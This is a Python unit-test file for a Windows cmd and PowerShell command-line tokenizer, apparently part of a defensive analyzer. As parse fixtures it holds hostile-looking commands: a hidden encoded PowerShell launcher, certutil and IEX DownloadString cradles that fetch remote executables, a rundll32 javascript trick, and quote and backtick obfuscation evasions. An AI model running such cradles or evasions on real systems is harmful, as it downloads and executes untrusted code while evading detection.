"""Tests for core.cmdline_parser — Layer 1 tokenizer and interpreter detection.

Written before the implementation, per ``docs/cmdline_analyzer_plan.md`` §6 A1:
the tokenizer is the module's highest-risk component and Windows quoting has
more corner cases than it looks like it does.
"""
from __future__ import annotations

import unittest

from core import cmdline_parser as cp


class TestInternalCommandTable(unittest.TestCase):
    def test_table_loads_and_is_normalized(self) -> None:
        table = cp.load_cmd_internal_commands()
        self.assertGreaterEqual(len(table), 40)
        for name in table:
            self.assertEqual(name, name.lower())

    def test_expected_internal_commands_present(self) -> None:
        table = cp.load_cmd_internal_commands()
        for name in ("dir", "copy", "del", "for", "set", "if", "echo", "start"):
            self.assertIn(name, table)

    def test_external_binaries_absent(self) -> None:
        # These are real executables, not cmd.exe builtins — mixing them in
        # would make is_internal_command() lie about what shipped with the shell.
        table = cp.load_cmd_internal_commands()
        for name in ("certutil", "powershell", "whoami", "net"):
            self.assertNotIn(name, table)

    def test_missing_data_file_degrades_to_empty(self) -> None:
        # Mirrors load_parent_child_pairs(): a broken dataset disables the
        # lookup, it never raises into a Streamlit rerun.
        cp.load_cmd_internal_commands.cache_clear()
        original = cp._INTERNAL_COMMANDS_FILE
        try:
            cp._INTERNAL_COMMANDS_FILE = original.with_name("does_not_exist.json")
            self.assertEqual(cp.load_cmd_internal_commands(), frozenset())
        finally:
            cp._INTERNAL_COMMANDS_FILE = original
            cp.load_cmd_internal_commands.cache_clear()


class TestDetectInterpreter(unittest.TestCase):
    def test_explicit_powershell_invocation(self) -> None:
        for line in (
            "powershell -nop -c whoami",
            "powershell.exe -EncodedCommand SQBFAFgA",
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden",
            "pwsh -File script.ps1",
            "PowerShell.EXE -Command dir",
        ):
            with self.subTest(line=line):
                self.assertEqual(cp.detect_interpreter(line), cp.INTERPRETER_POWERSHELL)

    def test_cmdlet_syntax_without_explicit_invocation(self) -> None:
        for line in (
            "Invoke-WebRequest -Uri http://example.com/a.exe -OutFile a.exe",
            "Get-ChildItem | Select-Object Name",
            "$client = New-Object Net.WebClient",
        ):
            with self.subTest(line=line):
                self.assertEqual(cp.detect_interpreter(line), cp.INTERPRETER_POWERSHELL)

    def test_defaults_to_cmd(self) -> None:
        for line in (
            "cmd.exe /c whoami",
            "certutil -urlcache -split -f http://example.com/a.exe",
            r"copy C:\a.txt C:\b.txt",
            "whoami /all",
        ):
            with self.subTest(line=line):
                self.assertEqual(cp.detect_interpreter(line), cp.INTERPRETER_CMD)

    def test_empty_input_is_unknown(self) -> None:
        self.assertEqual(cp.detect_interpreter(""), cp.INTERPRETER_UNKNOWN)
        self.assertEqual(cp.detect_interpreter("   \t "), cp.INTERPRETER_UNKNOWN)
        self.assertEqual(cp.detect_interpreter(None), cp.INTERPRETER_UNKNOWN)

    def test_hyphenated_non_cmdlet_is_not_powershell(self) -> None:
        # A hyphen in a filename must not read as a Verb-Noun cmdlet.
        self.assertEqual(
            cp.detect_interpreter(r"C:\tools\sql-backup.exe /full"), cp.INTERPRETER_CMD
        )


class TestTokenizeQuoting(unittest.TestCase):
    def test_plain_whitespace_split(self) -> None:
        self.assertEqual(cp.tokenize("cmd /c whoami", cp.INTERPRETER_CMD), ["cmd", "/c", "whoami"])

    def test_repeated_whitespace_collapses(self) -> None:
        self.assertEqual(cp.tokenize("cmd   \t /c  dir", cp.INTERPRETER_CMD), ["cmd", "/c", "dir"])

    def test_quoted_span_keeps_spaces_and_loses_quotes(self) -> None:
        self.assertEqual(
            cp.tokenize(r'copy "C:\Program Files\a.txt" b.txt', cp.INTERPRETER_CMD),
            ["copy", r"C:\Program Files\a.txt", "b.txt"],
        )

    def test_doubled_quote_inside_quotes_is_a_literal_quote(self) -> None:
        # MSVCRT argv rule: "" while quoted yields one literal " and stays quoted.
        self.assertEqual(cp.tokenize('echo "a""b"', cp.INTERPRETER_CMD), ["echo", 'a"b'])

    def test_intra_token_quotes_are_stripped_and_joined(self) -> None:
        # The classic quote-insertion evasion: pow""ershell is one token that
        # normalizes straight back to powershell.
        self.assertEqual(cp.tokenize('pow""ershell', cp.INTERPRETER_CMD), ["powershell"])
        self.assertEqual(cp.tokenize('"po"wer"shell"', cp.INTERPRETER_CMD), ["powershell"])

    def test_powershell_single_quotes(self) -> None:
        self.assertEqual(
            cp.tokenize("Write-Output 'hello world'", cp.INTERPRETER_POWERSHELL),
            ["Write-Output", "hello world"],
        )

    def test_powershell_doubled_single_quote_is_literal(self) -> None:
        self.assertEqual(
            cp.tokenize("Write-Output 'it''s'", cp.INTERPRETER_POWERSHELL), ["Write-Output", "it's"]
        )

    def test_single_quotes_are_not_quotes_in_cmd(self) -> None:
        # cmd.exe has no single-quote quoting; treating it as one would merge
        # tokens that the shell actually keeps apart.
        tokens = cp.tokenize("echo it's fine", cp.INTERPRETER_CMD)
        self.assertEqual(tokens, ["echo", "it's", "fine"])

    def test_empty_quoted_token_is_preserved(self) -> None:
        self.assertEqual(cp.tokenize('foo "" bar', cp.INTERPRETER_CMD), ["foo", "", "bar"])

    def test_empty_input_yields_no_tokens(self) -> None:
        self.assertEqual(cp.tokenize("", cp.INTERPRETER_CMD), [])
        self.assertEqual(cp.tokenize("    ", cp.INTERPRETER_CMD), [])


class TestTokenizeEscapes(unittest.TestCase):
    def test_cmd_caret_escapes_next_character(self) -> None:
        self.assertEqual(cp.tokenize("ech^o te^st", cp.INTERPRETER_CMD), ["echo", "test"])

    def test_cmd_caret_escapes_a_separator_into_a_literal(self) -> None:
        self.assertEqual(cp.tokenize("echo a^&b", cp.INTERPRETER_CMD), ["echo", "a&b"])

    def test_cmd_caret_is_literal_inside_quotes(self) -> None:
        self.assertEqual(cp.tokenize('echo "a^b"', cp.INTERPRETER_CMD), ["echo", "a^b"])

    def test_powershell_backtick_escapes_next_character(self) -> None:
        # w`r`i`t`e -> write, the most common PowerShell token-splitting evasion.
        tokens = cp.tokenize("i`e`x (n`e`w-object net.webclient)", cp.INTERPRETER_POWERSHELL)
        self.assertEqual(tokens[0], "iex")

    def test_powershell_backtick_is_literal_inside_single_quotes(self) -> None:
        self.assertEqual(
            cp.tokenize("Write-Output 'a`b'", cp.INTERPRETER_POWERSHELL), ["Write-Output", "a`b"]
        )

    def test_powershell_backtick_escapes_inside_double_quotes(self) -> None:
        self.assertEqual(
            cp.tokenize('Write-Output "a`"b"', cp.INTERPRETER_POWERSHELL), ["Write-Output", 'a"b']
        )

    def test_caret_is_not_an_escape_in_powershell(self) -> None:
        self.assertEqual(cp.tokenize("echo a^b", cp.INTERPRETER_POWERSHELL), ["echo", "a^b"])

    def test_trailing_escape_character_is_kept_literal(self) -> None:
        self.assertEqual(cp.tokenize("echo a^", cp.INTERPRETER_CMD), ["echo", "a^"])


class TestSplitStatements(unittest.TestCase):
    def test_cmd_ampersand_separators(self) -> None:
        self.assertEqual(
            cp.split_statements("whoami & hostname", cp.INTERPRETER_CMD), ["whoami", "hostname"]
        )
        self.assertEqual(
            cp.split_statements("whoami && hostname", cp.INTERPRETER_CMD), ["whoami", "hostname"]
        )

    def test_pipe_separates_in_both_interpreters(self) -> None:
        self.assertEqual(
            cp.split_statements("dir | findstr exe", cp.INTERPRETER_CMD), ["dir", "findstr exe"]
        )
        self.assertEqual(
            cp.split_statements("Get-Process | Stop-Process", cp.INTERPRETER_POWERSHELL),
            ["Get-Process", "Stop-Process"],
        )

    def test_powershell_semicolon_separates(self) -> None:
        self.assertEqual(
            cp.split_statements("$a=1; Invoke-Expression $a", cp.INTERPRETER_POWERSHELL),
            ["$a=1", "Invoke-Expression $a"],
        )

    def test_bare_ampersand_is_the_call_operator_in_powershell(self) -> None:
        # & is PowerShell's call operator, not a statement separator — splitting
        # on it would sever the operator from what it invokes.
        self.assertEqual(
            cp.split_statements("& 'C:\\tools\\a.exe' -run", cp.INTERPRETER_POWERSHELL),
            ["& 'C:\\tools\\a.exe' -run"],
        )

    def test_separators_inside_quotes_are_ignored(self) -> None:
        self.assertEqual(
            cp.split_statements('echo "a & b | c" & dir', cp.INTERPRETER_CMD),
            ['echo "a & b | c"', "dir"],
        )

    def test_escaped_separator_is_ignored(self) -> None:
        self.assertEqual(cp.split_statements("echo a^&b", cp.INTERPRETER_CMD), ["echo a^&b"])

    def test_url_query_ampersand_splits_when_unquoted(self) -> None:
        # Faithful to cmd.exe, which really does break here. The analyst sees
        # the same breakage the shell would have produced.
        self.assertEqual(
            cp.split_statements("curl http://x/a?b=1&c=2", cp.INTERPRETER_CMD),
            ["curl http://x/a?b=1", "c=2"],
        )

    def test_empty_segments_are_dropped(self) -> None:
        self.assertEqual(cp.split_statements("dir && && whoami", cp.INTERPRETER_CMD),
                         ["dir", "whoami"])


class TestStopParsing(unittest.TestCase):
    def test_stop_parsing_token_makes_remainder_verbatim(self) -> None:
        result = cp.parse_command_line('powershell.exe --% /c "a b" & whoami')
        self.assertEqual(len(result.commands), 1)
        cmd = result.commands[0]
        self.assertEqual(cmd.arguments[-1], '/c "a b" & whoami')

    def test_stop_parsing_only_applies_to_powershell(self) -> None:
        result = cp.parse_command_line("cmd.exe /c --% a b")
        self.assertIn("--%", result.commands[0].tokens)


class TestParseCommandLine(unittest.TestCase):
    def test_base_command_flags_and_arguments(self) -> None:
        result = cp.parse_command_line("powershell -nop -w hidden -enc SQBFAFgA")
        self.assertTrue(result.parse_ok)
        self.assertEqual(result.interpreter, cp.INTERPRETER_POWERSHELL)
        cmd = result.commands[0]
        self.assertEqual(cmd.base_command, "powershell")
        self.assertEqual(cmd.flags, ["-nop", "-w", "-enc"])
        self.assertEqual(cmd.arguments, ["hidden", "SQBFAFgA"])

    def test_tokens_preserve_full_ordering(self) -> None:
        # Layer 3 matches flag/value pairs like "-w hidden", which is only
        # possible against the ordered token list.
        result = cp.parse_command_line("powershell -w hidden -nop")
        self.assertEqual(result.commands[0].tokens, ["powershell", "-w", "hidden", "-nop"])

    def test_cmd_slash_flags(self) -> None:
        result = cp.parse_command_line("cmd.exe /c whoami")
        cmd = result.commands[0]
        self.assertEqual(cmd.base_command, "cmd.exe")
        self.assertEqual(cmd.flags, ["/c"])
        self.assertEqual(cmd.arguments, ["whoami"])

    def test_windows_path_argument_is_not_a_flag(self) -> None:
        result = cp.parse_command_line(r"copy C:\a.txt \\server\share\b.txt")
        self.assertEqual(result.commands[0].flags, [])
        self.assertEqual(len(result.commands[0].arguments), 2)

    def test_negative_number_is_not_a_flag(self) -> None:
        result = cp.parse_command_line("timeout -1")
        self.assertEqual(result.commands[0].flags, [])
        self.assertEqual(result.commands[0].arguments, ["-1"])

    def test_multiple_statements_produce_multiple_commands(self) -> None:
        result = cp.parse_command_line(
            "powershell -enc SQBFAFgA ; certutil -urlcache -f http://x/y z.exe"
        )
        self.assertEqual(len(result.commands), 2)
        self.assertEqual(result.commands[0].base_command, "powershell")
        self.assertEqual(result.commands[1].base_command, "certutil")

    def test_each_command_keeps_its_own_raw_text(self) -> None:
        result = cp.parse_command_line("dir | findstr exe", )
        self.assertEqual(result.commands[0].raw, "dir")
        self.assertEqual(result.commands[1].raw, "findstr exe")

    def test_interpreter_is_recorded_on_each_command(self) -> None:
        result = cp.parse_command_line("Get-Process | Stop-Process")
        for cmd in result.commands:
            self.assertEqual(cmd.interpreter, cp.INTERPRETER_POWERSHELL)

    def test_empty_input_is_not_ok_and_yields_nothing(self) -> None:
        for value in ("", "   ", None):
            with self.subTest(value=value):
                result = cp.parse_command_line(value)
                self.assertFalse(result.parse_ok)
                self.assertEqual(result.commands, [])
                self.assertEqual(result.interpreter, cp.INTERPRETER_UNKNOWN)

    def test_unterminated_quote_is_best_effort_but_flagged(self) -> None:
        result = cp.parse_command_line('powershell -c "IEX(New-Object Net.WebClient)')
        self.assertFalse(result.parse_ok)
        self.assertTrue(result.issues)
        # Still produced usable tokens rather than throwing them away.
        self.assertEqual(result.commands[0].base_command, "powershell")

    def test_unparseable_input_never_raises(self) -> None:
        for value in ('"', "^", "`", "|||", "&&&", '"""', "--%"):
            with self.subTest(value=value):
                result = cp.parse_command_line(value)
                self.assertIsInstance(result.commands, list)

    def test_is_internal_command(self) -> None:
        self.assertTrue(cp.is_internal_command("DIR"))
        self.assertTrue(cp.is_internal_command("set"))
        self.assertFalse(cp.is_internal_command("certutil.exe"))


class TestRealWorldSamples(unittest.TestCase):
    def test_encoded_powershell_dropper(self) -> None:
        line = (
            "powershell.exe -NoP -NonI -W Hidden -Exec Bypass "
            "-Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
        )
        result = cp.parse_command_line(line)
        self.assertTrue(result.parse_ok)
        cmd = result.commands[0]
        self.assertEqual(cmd.base_command.lower(), "powershell.exe")
        lowered = [f.lower() for f in cmd.flags]
        for flag in ("-nop", "-noni", "-w", "-exec", "-enc"):
            self.assertIn(flag, lowered)

    def test_certutil_download_cradle(self) -> None:
        line = "certutil.exe -urlcache -split -f http://198.51.100.7/a.exe C:\\Users\\Public\\a.exe"
        result = cp.parse_command_line(line)
        cmd = result.commands[0]
        self.assertEqual(cmd.base_command, "certutil.exe")
        self.assertIn("-urlcache", cmd.flags)
        self.assertIn("http://198.51.100.7/a.exe", cmd.arguments)

    def test_obfuscated_iex_download_string(self) -> None:
        line = (
            "p`o`w`e`r`s`h`e`l`l -c "
            "\"IEX (New-Object Net.WebClient).DownloadString('http://x/a')\""
        )
        result = cp.parse_command_line(line)
        self.assertEqual(result.commands[0].base_command, "powershell")

    def test_rundll32_javascript(self) -> None:
        line = 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)'
        result = cp.parse_command_line(line)
        self.assertEqual(result.commands[0].base_command, "rundll32.exe")

    def test_benign_scheduled_task_invocation(self) -> None:
        # Known-good sample: must parse cleanly and expose no surprises. The
        # calibration corpus (plan §6) grows from cases like this one.
        line = r'"C:\Program Files\Vendor\agent.exe" --service --config "C:\ProgramData\a.cfg"'
        result = cp.parse_command_line(line)
        self.assertTrue(result.parse_ok)
        cmd = result.commands[0]
        self.assertEqual(cmd.base_command, r"C:\Program Files\Vendor\agent.exe")
        self.assertEqual(cmd.flags, ["--service", "--config"])
        self.assertEqual(cmd.arguments, [r"C:\ProgramData\a.cfg"])


if __name__ == "__main__":
    unittest.main()
